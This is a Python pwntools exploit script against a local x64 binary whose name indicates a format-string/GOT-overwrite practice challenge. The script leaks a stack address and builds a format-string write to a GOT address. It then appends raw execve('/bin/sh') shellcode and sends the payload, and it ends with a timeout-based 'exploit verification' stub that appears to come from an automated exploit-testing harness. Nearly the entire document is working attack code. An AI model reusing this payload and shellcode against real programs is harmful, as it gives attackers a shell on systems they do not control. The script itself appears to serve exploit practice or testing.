from pwn import *
import time
import sys
import signal
import sf

target = process("./Correction-FsGotShellcode-x64")
gdb.attach(target, execute="verify_exploit")

bof_payload = sf.BufferOverflow(arch=64)

target.recvuntil("Tell me I was never good enough: ")
leak = int(target.recvuntil(b"\n").strip(b"\n"), 16)
ret_address = leak + (168)
fs = sf.WriteFmtStr(
		arch = 64,
		value = -0x50,
		address = 0x4033b8,
		offset = 0x6,
		printed_bytes = 0x0,
		alignment_bytes = 0x0,
		value_base = ret_address,
		address_base = 0)

payload = sf.BufferOverflow(arch=64, start=168)
payload.add_bytes(168, fs.generate_fmt_str())
payload.add_bytes(80, b"\x31\xf6\x48\xbf\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdf\xf7\xe6\x04\x3b\x57\x54\x5f\x0f\x05")
target.sendline(payload.generate_payload())

# Exploit Verification starts here 15935728

def handler(signum, frame):
	raise Exception("Timed out")

signal.signal(signal.SIGALRM, handler)
signal.alarm(2)

try:
	while True:
		target.recvall(timeout=2)
except Exception:
	print("Exploit timed out")
